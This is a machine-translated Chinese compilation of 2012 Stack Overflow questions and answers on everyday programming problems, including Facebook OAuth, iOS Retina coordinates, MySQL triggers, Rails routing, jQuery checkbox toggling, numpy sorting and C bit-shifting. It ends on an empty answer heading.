我正处于在文档中启动我的应用程序的这一步：

[https://developers.facebook.com/docs/appsonfacebook/tutorial/#auth](https://developers.facebook.com/docs/appsonfacebook/tutorial/#auth)

其中有一个代码块（据说）将用户转发到请求对话框，询问是否允许访问有关他们的某些信息。我已将此代码块放入我的画布 URL 指向的 PHP 脚本中，并将 和 分别更改`$app_id`为`$canvas_page`我的应用程序 ID 和画布 URL。我没有收到预期的对话框，而是从 facebook 收到以下错误：

```
"An error occurred. Please try again later." 
```

不存在有关该错误的其他详细信息。我尝试了脚本的一些变体，甚至尝试直接加载此 URL 以查看是否可行。请注意，我已将`YOUR_APP_ID`and替换`YOUR_CANVAS_PAGE`为适当的值，并确保拼写和/或标点符号正确：

```
https://www.facebook.com/dialog/oauth?client_id=YOUR_APP_ID&redirect_uri=YOUR_CANVAS_PAGE&scope=email,read_stream 
```

对于重定向 URL，我尝试在它前面加上`http://`, `https://`，并且根本没有前缀。所有的结果都是一样的。

我的问题：**文档中的示例是否损坏，或者文档中提供的 oauth 链接当前是否已关闭？**错误的模糊性质有点令人沮丧，因为我无法判断这是我做错了什么，还是 facebook 的 oauth 功能有问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T19:52:51.837

因此，问题在于，当我最初将应用程序创建为 OAuth URL 中的 YOUR_APP_ID 参数时，我没有使用 facebook 为我分配的数字应用程序 ID，而是使用了应用程序命名空间字符串。Facebook 不理解此类请求，并返回了一般错误消息。

一旦我使用了数字应用程序 ID，OAuth 对话框就会弹出，要求访问我的帐户，正如预期的那样。

# objective-c - 适用于 iPad 视网膜显示屏的 XCode 坐标

> ID：10078444
> 
> 赞同：5
> 
> 时间：2012-04-09T19:14:26.523
> 
> 标签：objective-c, ios, xcode, interface-builder

在尝试为新的 iPad Retina 显示屏更新我的应用程序时，我刚刚注意到一件有趣的事情，Interface Builder 中的每个坐标仍然基于原始的 1024x768 分辨率。

我的意思是，如果我有一个 2048x1536 的图像让它适合显示器上的整个屏幕，我需要将它的大小设置为 1024x768 而不是 2048x1536。

我只是好奇这是故意的吗？我可以将 Interface Builder 中的坐标系切换为特定于 Retina 吗？这有点烦人，因为我的一些图形在宽度或高度上都不是原始图形的 2 倍。我似乎无法在 Interface Builder 中设置 1/2 坐标数，例如 1.5，它可以是 1 或 2。

此时我是否应该只在代码中进行界面设计而忘记界面构建器？让我的图形在两个方向上都精确 2 倍？还是只是忍受它？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T20:32:54.150

iOS 上的界面基于点，而不是像素。图像必须是原件大小的 2 倍。

> > 点与像素 在 iOS 中，您在绘图代码中指定的坐标与底层设备的像素是有区别的。当使用 Quartz、UIKit 和 Core Animation 等原生绘图技术时，您可以使用逻辑坐标空间指定坐标值，该空间以点为单位测量距离。该逻辑坐标系与系统框架用来管理屏幕像素的设备坐标空间分离。系统自动将逻辑坐标空间中的点映射到设备坐标空间中的像素，但这种映射并不总是一对一的。这种行为导致了一个重要的事实，你应该永远记住：
> 
> 一点不一定对应屏幕上的一个像素。使用点（和逻辑坐标系）的目的是提供与设备无关的一致大小的输出。点的实际大小无关紧要。点的目标是提供一个相对一致的比例，您可以在代码中使用它来指定视图和渲染内容的大小和位置。点如何实际映射到像素是系统框架处理的一个细节。例如，在具有高分辨率屏幕的设备上，一个点宽的线条实际上可能会在屏幕上产生一个两个像素宽的线条。结果是，如果你在两个相似的设备上绘制相同的内容，其中只有一个具有高分辨率屏幕，
> 
> 在您自己的绘图代码中，您大部分时间都使用点，但有时您可能需要知道点如何映射到像素。例如，在高分辨率屏幕上，您可能希望使用额外的像素在内容中提供额外的细节，或者您可能只想以微妙的方式调整内容的位置或大小。在 iOS 4 和更高版本中，UIScreen、UIView、UIImage 和 CALayer 类公开了一个比例因子，告诉您该特定对象的点和像素之间的关系。在 iOS 4 之前，这个比例因子被假定为 1.0，但在 iOS 4 及更高版本中，它可能是 1.0 或 2.0，具体取决于底层设备的分辨率。将来，其他比例因子也可能是可能的。

来自[http://developer.apple.com/library/ios/#documentation/2DDrawing/Conceptual/DrawingPrintingiOS/GraphicsDrawingOverview/GraphicsDrawingOverview.html](http://developer.apple.com/library/ios/#documentation/2DDrawing/Conceptual/DrawingPrintingiOS/GraphicsDrawingOverview/GraphicsDrawingOverview.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T20:33:47.750

这是 Apple 有意为之，使您的代码在定位控件和文本时相对独立于实际屏幕分辨率。但是，正如您所指出的，它会使以设备的最大分辨率显示图形变得有点复杂。

对于 iPhone，屏幕始终为 480 x 320 点。对于 iPad，它是 1024 x 768。如果您的图形针对设备进行了适当的缩放，那么在代码中处理这种影响并不难。我不是平面设计师，事实证明，我必须提供多组图标、启动图像等来解决高分辨率问题，这对我来说有点挑战。

Apple 为某些图像类型制定了命名标准，以最大限度地减少对代码的影响：

[https://developer.apple.com/library/ios/#DOCUMENTATION/UserExperience/Conceptual/MobileHIG/IconsImages/IconsImages.html](https://developer.apple.com/library/ios/#DOCUMENTATION/UserExperience/Conceptual/MobileHIG/IconsImages/IconsImages.html)

但是，当您处理内联自定义图形时，这对您没有帮助。

# mysql - 如何在 2 个表之间执行此 MYSQL 触发器？

> ID：10078445
> 
> 赞同：0
> 
> 时间：2012-04-09T19:14:27.930
> 
> 标签：mysql, triggers

例如，如果我在 TABLE1 上有 2 列名为“id”和“count”，其中包含“count”列中的数字，当这些数字达到 50 或以上时，我希望触发器更新 TABLE2 上名为“reached”的列，并使用“是”及其 id，在 id 列中

怎么做到呢？谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T19:18:56.330

```
delimiter |

CREATE TRIGGER table1_trigger AFTER UPDATE ON table1
FOR EACH ROW BEGIN
  IF NEW.count >= 50
  then
     update table2 set reached = 'yes' where id = NEW.id;
  end if;
END;

| 
```

# asp.net-mvc-3-areas - MVC3 路由从一个区域到默认

> ID：10078451
> 
> 赞同：0
> 
> 时间：2012-04-09T19:14:52.450
> 
> 标签：asp.net-mvc-3-areas

从事 MVC3 项目。我有一个名为“Area”的区域，其 areaRegistration 如下所示，

```
 context.MapRoute(
            "Area_Details",
            "Area/{controller}/{AreaId}/{AreaName}/{id}/{action}",
            new { controller = "Area", action = "Index" }
        );

        context.MapRoute(
            "Area_default",
            "Area/{controller}/{action}/{id}",
            new { action = "Index", id = UrlParameter.Optional }
        ); 
```

我在/Controller“Home”中有另一个控制器，其动作“Details”返回一个PartialView。

从“区域”区域的角度来看，我正在尝试

```
@Html.RenderAction("Details","Home", new{ myId = 1}) 
```

应该访问 /home/details?myId=1 但它正在尝试访问 /area/home/details?myId=1

我怎么解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T19:18:06.620

我认为这会起作用：

```
Html.RenderAction("action", "controller", new { area = "" }) 
```

# jquery - 使用 jquery 滑动页面转换

> ID：10078452
> 
> 赞同：0
> 
> 时间：2012-04-09T19:14:54.647
> 
> 标签：jquery, ajax, transitions, sliding

我正在做一个简单的项目，该项目在全屏样式页面中显示一些客户的作品。当我单击一个链接时，一个项目会加载并以 100% 的宽度和高度显示。我在页面上有一个指向上一个和下一个项目的链接，但是当单击“下一个”按钮时，我需要内容向左滑动，单击“上一个”按钮时，内容需要向右滑动。我的转换工作和动画方向正确，但我不确定如何通过 jquery ajax 加载我的新内容（下一个或上一个项目）。我的想法是在屏幕的左侧和右侧创建“占位符”容器并将内容加载到其中并从左侧和右侧滑入，但这对我来说感觉有点笨拙。有关如何处理此问题的任何建议？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T20:35:00.467

What you suggests the correct way to do it, how else could you animate something in?

# ruby-on-rails - 从另一台计算机访问 Rails 开发服务器

> ID：10078454
> 
> 赞同：26
> 
> 时间：2012-04-09T19:15:00.877
> 
> 标签：ruby-on-rails, macos, webrick

我正在使用 webrick 在 Mac OS X Lion 上开发我的 rails 应用程序。我正在尝试从另一台计算机访问该站点（用于测试）。我电脑的内部IP是10.1.10.100。

访问`10.1.10.100`显示由我的计算机上运行的 apache 服务器提供的页面。

`10.1.10.100:3000`从我的计算机和同一网络上的另一台计算机访问超时。我可以ping通`10.1.10.100`。在我的电脑上，`loaclhost:3000`显示应用程序。

是否有我需要在 Mac OS X 上打开的防火墙或需要应用的其他设置？

谢谢

* * *

## 回答 #1

> 赞同：50
> 
> 时间：2012-04-09T19:26:31.580

While starting the webrick server specify the IP on which your rails application will run (10.1.10.100 in your case) using -b option, it binds Rails to the specified IP.

```
rails server -b 10.1.10.100 -p 3000 
```

# javascript - Mustache 模板 - 呈现 JSON 集合

> ID：10078456
> 
> 赞同：0
> 
> 时间：2012-04-09T19:15:12.607
> 
> 标签：javascript, mustache

我正在尝试呈现一个 JSON 集合，该集合是异步检索的，并且使用 FireBug 我可以看到它最终看起来像：

```
[{"Id":"00000010"},{"Id":"00000002"},{"Id":"00000003"}] 
```

这不起作用，但如果我将集合声明为：

```
[{ "Id": "00000004" }, { "Id": "00000005" }, { "Id": "00000006"}] 
```

这可行，然后使用 FireBug 我可以看到这略有不同：

```
[Object { Id="00000004"}, Object { Id="00000005"}, Object { Id="00000006"}] 
```

为什么在同步检索数据和声明集合时会有所不同？我有什么选择可以让它发挥作用。

谢谢。

**更新**

我也在使用 sammy.js，这里是 JavaScript：

```
var app = $.sammy('div[role="main"]', function () {

    this.use('Mustache', 'html');

    this.get('#/', function (context) {
        this.load('/data')
            .then(function (response) {

                context.blah = 'blah';
                context.data = response;

                var data2 = [{ "Id": "00000004" }, { "Id": "00000005" }, { "Id": "00000006"}];
                context.data2 = data2;

                var templateUrl = '@Url.Content("~/Templates/template.html")';

                context.partial(templateUrl);
            });
    });
});

$(function () {
    app.run('#/');
}); 
```

这是模板：

```
<h1>{{blah}}</h1>
<ul>
{{#data}}
<li>{{Id}}</li>
{{/data}}
</ul>
<ul>
{{#data2}}
<li>{{Id}}</li>
{{/data2}}
</ul> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T20:20:38.243

Okay, I figured this one out!

```
context.data = response; 
```

becomes

```
context.data = JSON.parse(response); 
```

# javascript - 如何切换复选框选择而不仅仅是选择？

> ID：10078459
> 
> 赞同：0
> 
> 时间：2012-04-09T19:15:24.393
> 
> 标签：javascript, jquery

我目前正在使用此 JavaScript 代码片段一次选择 3 个复选框

```
$(document).ready(function() {
   var $cbs = $('input:checkbox[name="select[]"]'),
       $links = $('a[name="check"]');

   $links.click(function() {
      var start = $links.index(this) * 3,
          end = start + 3;
      $cbs.slice(start,end).prop("checked",true);
   });
}); 
```

目前此代码仅选择复选框，但我想知道是否有人知道如何修改它以便打开和关闭复选框选择？

这是我当前代码的示例：“ [jsfiddle](http://jsfiddle.net/ShZNF/) ” - 单击 1-3、4-6 链接等以选中复选框。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T19:19:23.890

使`prop("checked", ...)`调用的第二个参数取决于切片中第一个（或其他）复选框的“已检查”状态：

```
// ...
$cbs.slice(start,end).prop("checked", !$cbs.slice(start).prop("checked")); 
```

这是一个[更新的 jsFiddle](http://jsfiddle.net/ShZNF/2/)。

**[编辑]**或者单独更新切片中的每个复选框：

```
// ...
$cbs.slice(start,end).each(function() {
  var $this = $(this);
  $this.prop("checked", !$this.prop("checked"));
}); 
```

[http://jsfiddle.net/ShZNF/3/](http://jsfiddle.net/ShZNF/3/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T19:22:58.377

```
 $cbs.slice(start,end).each(function() {
       if ($(this).is(":checked")) {
           $(this).removeProp("checked");   
       } else {
           $(this).prop("checked",true);
       }
   }); 
```

[http://jsfiddle.net/ShZNF/1/](http://jsfiddle.net/ShZNF/1/)

编辑：Maeric 的解决方案更好。我不知道 removeProp 有这个问题：

> 注意：请勿使用此方法删除本机属性，例如选中、禁用或选中。这将完全删除该属性，并且一旦删除，就不能再次将其添加到元素中。使用 .prop() 将这些属性设置为 false。

# javascript - 在 Javascript 性能中播放声音很重吗？

> ID：10078463
> 
> 赞同：3
> 
> 时间：2012-04-09T19:15:28.957
> 
> 标签：javascript, performance, html, audio, html5-audio

我正在用 Javascript 制作一个简单的游戏，其中当一个物体与墙壁碰撞时，它会发出“砰”的一声。该声音的响度取决于物体的速度（更高的速度=>更大的声音）。

播放功能：

```
playSound = function(id, vol) //ID of the sound in the sounds array, volume/loudness of the sound
{
    if (vol) //sometimes, I just want to play the sound without worrying about volume
        sounds[id].volume = vol;
    else
        sounds[id].volume = 1;

    sounds[id].play();
} 
```

我怎么称呼它：

```
playSound(2, Math.sqrt(p.vx*p.vx + p.vy*p.vy)/self.TV); //self.TV stands for terminal velocity. This calculates the actual speed using the basic Pythagora's theorem and then divides it by self.TV, which results in a number from 0 to self.TV. 2 is the id of the sound I want to play. 
```

在 Chrome 中，一切都很好。然而，在 Firefox 中，每次发生与墙壁的碰撞（=>`playSound`被调用）时，都会有一个持续近半秒的暂停！起初，我以为问题出在`Math.sqrt`，但我错了。这就是我测试它的方式：

```
//playSound(2, 1); //2 Is the id of the sound I want to play, and 1 is max loudness
Math.sqrt(p.vx*p.vx + p.vy*p.vy)/self.TV;
Math.sqrt(p.vx*p.vx + p.vy*p.vy)/self.TV;
Math.sqrt(p.vx*p.vx + p.vy*p.vy)/self.TV; 
```

这完全消除了碰撞延迟，让我相信这`Math.sqrt`根本不会引起任何问题。不过，可以肯定的是，我这样做了：

```
playSound(2, 1); //2 Is the id of the sound I want to play, and 1 is max loudness
//Math.sqrt(p.vx*p.vx + p.vy*p.vy)/self.TV;
//Math.sqrt(p.vx*p.vx + p.vy*p.vy)/self.TV;
//Math.sqrt(p.vx*p.vx + p.vy*p.vy)/self.TV; 
```

滞后又回来了！现在我确定播放声音会导致问题。我对么？为什么会这样？我如何解决它？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-09T19:36:59.180

当玩家发射武器时，我遇到了同样的延迟问题。我的解决方案有两个：

1.  在加载时播放每个声音，然后立即暂停。这将允许它快速恢复播放，而不是从头开始播放。在每次播放声音后执行此播放暂停技巧。

2.  为每种声音使用一个对象池`<audio>`，而不是为每种声音类型使用一个音频对象。不只是使用`sounds[id]`，而是使用二维数组，使用`sound[id][count]`. 这里，`sound[id]`是所有具有相同声音的音频对象的列表，并且`count`是用于该声音 id 的当前对象的索引。每次调用 时`playSound(id)`，增加与该 id 关联的计数，以便下一次调用调用不同的音频对象。

我不得不一起使用这些，因为播放暂停技术可以很好地将缓冲延迟移动到需要播放声音*之前*，但如果你需要快速播放声音，你仍然会得到延迟。这样，最近使用的音频对象可以在另一个对象播放时“充电”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T19:42:46.733

可能对您有所帮助的两件事是利用[Web 工作者](http://www.whatwg.org/specs/web-apps/current-work/multipage/workers.html)或预先预先计算多个响度级别，您也可以在后台使用工作者线程执行此操作。我这样说并没有涉及 Web 音频 API 的特性或您如何计算声音输出，但如果您已经用尽了所有其他方法，这可能是您应该关注的下一个方向。

# javascript - 揭示模块模式函数初始化风格

> ID：10078464
> 
> 赞同：3
> 
> 时间：2012-04-09T19:15:30.983
> 
> 标签：javascript, design-patterns

我想知道，初始化对象时附加括号的意义是什么。例如：

```
var foo = function(){ ... }(); 
```

相对

```
var foo = (function(){ ... }()); 
```

我假设一些与范围有关的东西，但我想知道是否有人可以更准确地了解具体差异，因为它们似乎都是根据每个匿名函数返回的内容来初始化一个对象。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-09T19:26:02.067

In that specific case, there's no effective difference.

Some people like the outer `(...)` because it gives them a visual hint near the `=` operator that the function is being invoked.

But the assignment operator causes the `function` to be evaluated as the expression that is the right hand operand of the assignment operator, and as such it can be invoked without any further need to coerce it out of a function declaration.

* * *

Without the assignment, there needs to be some syntax involved that lets the interpreter know that the `function` keyword is being used as an anonymous function expression.

For example...

```
(function() {
   // code
})(); 
```

Here the parentheses resolved the ambiguity of `function` so that it's treated as the single expression inside the `(...)` group.

* * *

The grouping operator is just one way of forcing a `function` to be evaluated as an expression. Most JavaScript operators can be used for this purpose. Unary operators are probably safest, for example...

```
!function() {
   // code
}(); 
```

...or...

```
void function() {
   // code
}(); 
```

In both cases, the `function` is seen as the single operand to the respective operator.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T19:41:49.150

两者在功能上是等效的。

然而，作为惯例，许多程序员更喜欢用左括号来表示 var 是函数的结果，而不是函数本身。

自调用函数的使用是传入变量来保存它们的“命名空间”，例如传入window或document，或者jquery之类的其他东西是很常见的。

根据对 jslint 的一些快速测试，这样做的首选方式是以下测试中的第一个 (foo)。

```
var foo = (function () {}());
var bar = (function () {})();
var baz = function () {}(); 
```

请注意，调用 () 在外括号内。

JSLint 为 bar 和 baz 提供以下错误

> 错误：
> 
> 第 2 行字符 28 处的问题：将调用移动到包含函数的括号中。
> 
> var bar = (function (w) {})(window);
> 
> 第 3 行字符 27 处的问题：将立即函数调用括在括号中，以帮助读者理解表达式是函数的结果，而不是函数本身。
> 
> var baz = 函数 (w) {}(窗口);

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T19:22:08.047

据我所知，这只是一个约定，并不是绝对必要的。

这是一篇很好的文章，说明了为什么这个约定很有用：

[http://peter.michaux.ca/articles/an-important-pair-of-parens](http://peter.michaux.ca/articles/an-important-pair-of-parens)

# plugins - clang 插件 ASTConsumer

> ID：10078465
> 
> 赞同：2
> 
> 时间：2012-04-09T19:15:32.337
> 
> 标签：plugins, llvm, clang

嘿，我试图生成给定 .c 或 .cpp 文件的调用图。我写了一个clang插件来生成调用图。我写了以下函数。

```
class CGASTActionConsumer:public ASTConsumer{
  CallGraph *CG;
    public:
        CGASTActionConsumer(CallGraph *inCG):CG(inCG){}
      virtual bool HandleTopLevelDecl(DeclGroupDef DG)
       {
         for(DeclGroupRef::iterator i=begin(),e=end();i!=e;++i)
          {
            if(FunctionDecl *FD = dyn_cast<FunctionDecl>(D))
              {
                if(/* check function is valid for insertion to graph   */)
                  CG->addToCallGraph(FD,FD->isGlobal()); // add node in call graph
              }
          }
       }

}; 
```

当我尝试从外部 HandleTopLevelDecl 函数打印图形时，它不会打印任何东西。但是当我从 HandleTopLevelDecl 函数中调用 print 函数时，它将打印每个节点的输出。谁能告诉我为什么会这样？谢谢。

# python - 按升序对numpy矩阵行值进行排序

> ID：10078470
> 
> 赞同：9
> 
> 时间：2012-04-09T19:16:00.650
> 
> 标签：python, arrays, matrix, numpy

**我有以下 numpy 矩阵，我想根据第三列值**按升序排序。

```
[[  3.05706500e+06   4.98000000e+01  -2.62500070e+01  -9.38135544e+01]
 [  3.05706600e+06   4.98000000e+01  -3.00000056e+01  -9.38135544e+01]
 [  3.05706700e+06   4.98000000e+01  -3.37500042e+01  -9.38135544e+01]
 [  3.05706800e+06   4.98000000e+01  -3.75000028e+01  -9.38135544e+01]] 
```

这是我真正想要的矩阵。

```
[[  3.05706800e+06   4.98000000e+01  -3.75000028e+01  -9.38135544e+01]
 [  3.05706700e+06   4.98000000e+01  -3.37500042e+01  -9.38135544e+01]
 [  3.05706600e+06   4.98000000e+01  -3.00000056e+01  -9.38135544e+01]
 [  3.05706500e+06   4.98000000e+01  -2.62500070e+01  -9.38135544e+01]] 
```

我如何只使用 numpy 来做到这一点？任何帮助，将不胜感激。谢谢！

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-04-09T19:27:12.870

给定你的数组

```
>>> arr
array([[  3.05706500e+06,   4.98000000e+01,  -2.62500070e+01,
         -9.38135544e+01],
       [  3.05706600e+06,   4.98000000e+01,  -3.00000056e+01,
         -9.38135544e+01],
       [  3.05706700e+06,   4.98000000e+01,  -3.37500042e+01,
         -9.38135544e+01],
       [  3.05706800e+06,   4.98000000e+01,  -3.75000028e+01,
         -9.38135544e+01]]) 
```

您可以简单地使用带有axis = 0的numpy.sort来根据需要对其进行排序

```
>>> numpy.sort(arr,axis=0)
array([[  3.05706500e+06,   4.98000000e+01,  -3.75000028e+01,
         -9.38135544e+01],
       [  3.05706600e+06,   4.98000000e+01,  -3.37500042e+01,
         -9.38135544e+01],
       [  3.05706700e+06,   4.98000000e+01,  -3.00000056e+01,
         -9.38135544e+01],
       [  3.05706800e+06,   4.98000000e+01,  -2.62500070e+01,
         -9.38135544e+01]])
>>> 
```

* * *

我相信我之前的回答是错误的，因为我误解了这个问题。这里是正确答案

```
>>> arr[arr[:,2].argsort()]
array([[  3.05706800e+06,   4.98000000e+01,  -3.75000028e+01,
         -9.38135544e+01],
       [  3.05706700e+06,   4.98000000e+01,  -3.37500042e+01,
         -9.38135544e+01],
       [  3.05706600e+06,   4.98000000e+01,  -3.00000056e+01,
         -9.38135544e+01],
       [  3.05706500e+06,   4.98000000e+01,  -2.62500070e+01,
         -9.38135544e+01]])
>>> 
```

# wcf - 可以使用 WCF 获取的最大行数

> ID：10078475
> 
> 赞同：0
> 
> 时间：2012-04-09T19:16:13.333
> 
> 标签：wcf, rows

使用 WCF 服务可以获取多少行？使用 WCF 服务可以返回的行数是否有上限？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T19:22:29.840

没有上限，如果你需要超过当时可用的，你需要在响应中更改限制，默认为 65536

修改 web.config 文件以更改它

[http://msdn.microsoft.com/en-us/library/ms734663.aspx](http://msdn.microsoft.com/en-us/library/ms734663.aspx)

# php - 表行跨度问题

> ID：10078478
> 
> 赞同：1
> 
> 时间：2012-04-09T19:16:21.353
> 
> 标签：php, html, html-table

我有下表。标题就在它的外观上，内容是在 PHP 循环中生成的。它包含用户必须支付的一些税款，并且可以分期支付税款。例如，如果用户必须支付 100 美元的税，他先支付 25 美元，然后支付 75 美元，那么表格中将有两行用于该税。

我似乎未能完成的是制作一个行跨度，因此税名将只显示一次。

任何帮助表示赞赏。

```
<table cellpadding="0" cellspacing="0" width="100%" class="sortable">
    <thead>
        <tr>                                                        
            <th width="10%">Tax name</th>
            <th width="10%">Value</th>
            <th width="10%">Paid</th>
            <th width="10%">Rest</th>            
        </tr>
    </thead>
    <tbody>
        <tr>                                    
            <td>Sign-up tax</td>
            <td>100$</td>
            <td>25$</td>
            <td>75$</td>                        
        </tr>   
        <tr>                                    
            <td>Sign-up tax</td>
            <td>100$</td>
            <td>75$</td>
            <td>0$</td>                        
        </tr>
    </tbody>
</table> 
```

PHP 代码如下所示：

```
<?php for ($i = 0; $i < count($tax_details); $i++): ?>
<tr>                                    
    <td><?php echo $tax_details[$i]['name']; ?></td>
    <td><?php echo $tax_details[$i]['value']; ?></td>
    <td><?php echo $tax_details[$i]['paid']; ?></td>
    <td><?php echo $tax_details[$i]['rest']; ?></td>                        
</tr>
<?php endfor; ?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T19:18:25.260

用这个替换html：

```
<tbody>
    <tr>                                    
        <td rowspan="2">Sign-up tax</td>   <---add rowspan here
        <td>100$</td>
        <td>25$</td>
        <td>75$</td>                        
    </tr>   
    <tr>                                    
        <td>100$</td>         <---remove second sign-up tax from here
        <td>75$</td>
        <td>0$</td>                        
    </tr>
</tbody> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T19:28:41.753

您的代码看起来正确，我没有看到问题。

```
<table border="0" cellpadding="0" cellspacing="0" width="100%" class="sortable">
    <thead>
        <tr>                                                        
            <th width="10%">Tax name</th>
            <th width="10%">Value</th>
            <th width="10%">Paid</th>
            <th width="10%">Rest</th>            
        </tr>
    </thead>
<tbody>
<?php for ($i = 0; $i < count($tax_details); $i++): ?>
<tr>                                    
    <td><?php echo $tax_details['name']; ?></td>
    <td><?php echo $tax_details['value']; ?></td>
    <td><?php echo $tax_details['paid']; ?></td>
    <td><?php echo $tax_details['rest']; ?></td>                        
</tr>
<?php endif; ?>
    </tbody>
</table> 
```

我不明白你在问什么。

# jquery-plugins - jquerymobile拆分视图右面板不转换

> ID：10078482
> 
> 赞同：0
> 
> 时间：2012-04-09T19:16:34.350
> 
> 标签：jquery-plugins, jquery-mobile, ipad

我正在使用以下链接中的拆分视图：

[https://github.com/asyraf9/jquery-mobile/tree/gh-pages](https://github.com/asyraf9/jquery-mobile/tree/gh-pages)

当我单击演示按钮时，菜单页面会发生变化，但右侧面板没有变化，如演示页面所示。有人可以提供一些线索是什么问题吗？

下面是演示链接：

[http://asyraf9.github.com/jquery-mobile/](http://asyraf9.github.com/jquery-mobile/)

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T19:55:08.953

看起来该演示使用 jQuery Mobile 1.0 Final（基于 JS 顶部的日期）。

*如果您实际使用的是 jQuery Mobile 1.0 Final，则可以忽略其余部分。*

在 1.0.1 中，jQuery Mobile 转而只对宽度小于`1000px`宽的浏览器使用页面转换（我相信这就是数字）。在 1.1.0 中，这已更改为仅对`fade`屏幕宽度过大的浏览器使用过渡。

此行为已添加到 jQuery Mobile 中，因为过渡通常在大屏幕上看起来很笨重（因为必须同时绘制这么多像素）。

> **设置过渡的最大宽度**
> 
> 默认情况下，当窗口宽度大于某个像素宽度时，可以禁用过渡（设置为“无”）。此功能很有用，因为过渡可能会分散注意力或在较大的屏幕上表现不佳。该值可通过全局选项 $.mobile.maxTransitionWidth 进行配置，默认为 false。该选项接受表示像素宽度或假值的任何数字。如果它不为假，则当窗口宽度大于指定值时，处理程序将使用“无”转换。

*来源：http: [//jquerymobile.com/demos/1.1.0-rc.2/docs/pages/page-transitions.html](http://jquerymobile.com/demos/1.1.0-rc.2/docs/pages/page-transitions.html)*

# ruby-on-rails - Rails - 使用脚手架，错误链接到新资源

> ID：10078483
> 
> 赞同：2
> 
> 时间：2012-04-09T19:16:35.653
> 
> 标签：ruby-on-rails, ruby

我正在学习 Ruby on Rails，我做了这个脚手架命令：

```
rails g scaffold Alex 
```

它运行并为我创建了所有资源。所以我试图从我的索引页面链接到 alex 页面，如下所示：

```
<%= link_to "Alex Link", alex_path(@alex) %> 
```

（我仍然不确定@alex 部分是什么，但它在其他示例中，所以我试图在那里拥有它）

在我的 routes.rb 中创建了这个代码：

```
 resources :alexes

  get "home/index" 
```

当我尝试加载链接时，它给了我这个错误：

```
No route matches {:action=>"show", :controller=>"alexes"} 
```

以防万一，这是来自的输出`rake routes`：

```
 alexes GET    /alexes(.:format)          alexes#index
           POST   /alexes(.:format)          alexes#create
  new_alex GET    /alexes/new(.:format)      alexes#new
 edit_alex GET    /alexes/:id/edit(.:format) alexes#edit
      alex GET    /alexes/:id(.:format)      alexes#show
           PUT    /alexes/:id(.:format)      alexes#update
           DELETE /alexes/:id(.:format)      alexes#destroy
home_index GET    /home/index(.:format)      home#index
      root        /                          home#index
      test POST   /test(.:format)            tests#create
  new_test GET    /test/new(.:format)        tests#new
 edit_test GET    /test/edit(.:format)       tests#edit
           GET    /test(.:format)            tests#show
           PUT    /test(.:format)            tests#update
           DELETE /test(.:format)            tests#destroy 
```

我建立链接的方式有什么问题，我怎样才能让它在进入视图之前击中控制器？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T19:19:56.143

`alex_path`用于显示*特定* `Alex`对象。要使用它，`@alex`需要是`Alex`控制器加载的对象的实例。

你说你想链接到“Alex 页面”，这让我觉得你想要*所有* `Alex`对象的列表，或者`index`你的`AlexController`. 如果是这种情况，您应该使用`alexes_path`而不是`alex_path(@alex)`.

如果您确实想链接到单个特定的`Alex`，则需要从数据库中加载一个实例：

```
def my_action
  # make a specific Alex object available to the view
  @alex = Alex.find(...)
end 
```

* * *

顺便说一句，您还问：

> 我怎样才能让它在进入视图之前击中控制器？

您的控制器将*始终*在视图呈现之前被击中。如果不调用操作，就不可能呈现视图。

# c - 将两个整数与位移相结合

> ID：10078484
> 
> 赞同：1
> 
> 时间：2012-04-09T19:16:44.310
> 
> 标签：c, bit-manipulation

我正在编写一个程序，我必须将数字对之间的距离存储在哈希表中。

我将得到一个 Range R。假设范围是 5。现在我必须找到以下对之间的距离：

```
1 2
1 3
1 4
1 5
2 3
2 4
2 5
3 4
3 5
4 5 
```

也就是说，对的总数是(R^2/2 -R)。我想将它存储在哈希表中。所有这些都是无符号整数。所以有32位。我的想法是，我采用无符号长整数（64 位）。
假设我需要散列 1 和 5 之间的距离。现在

```
long k = 1;
k = k<<31;
k+=5; 
```

因为我有 64 位，所以我将第一个数字存储在前 31 位中，将第二个数字存储在第二个 31 位中。这保证了唯一的键，然后可以用于散列。

但是当我这样做时：

```
long k = 2;
k << 31;
k+= 2; 
```

k 的值变为零。

我无法理解这个不断变化的概念。

基本上我想要实现的是，

```
An unsigned long has    | 32bits    |  32 bits  |
Store                   |1st integer|2nd integer| 
```

如何实现这一点以获得每对的唯一密钥？

我在 64 位 AMD Opteron 处理器上运行代码。 `sizeof(ulong)`返回 8。所以它是 64 位。`long long`在这种情况下我需要一个吗？

我还需要知道这是否会创建唯一键？据我了解，它似乎确实创建了唯一的键。但我想要一个确认。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T19:40:18.847

假设您使用的是 C 或遵循模糊相似规则的东西，您的问题主要出在类型上。

```
long k = 2;  // This defines `k` a a long
k << 31;     // This (sort of) shifts k left, but still as a 32-bit long. 
```

您几乎可以肯定想要/需要做的是在将其向左移动*之前*`k`转换为 a ，因此您将在 64 位字中移动。`long long`

 *```
unsigned long first_number = 2;
unsigned long long both_numbers = (unsigned long long)first_number << 32;
unsigned long second_number = 5;
both_numbers |= second_number; 
```

在这种情况下，如果（例如）您`both_numbers`以十六进制打印出 ，您应该得到`0x0000000200000005`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T19:32:39.150

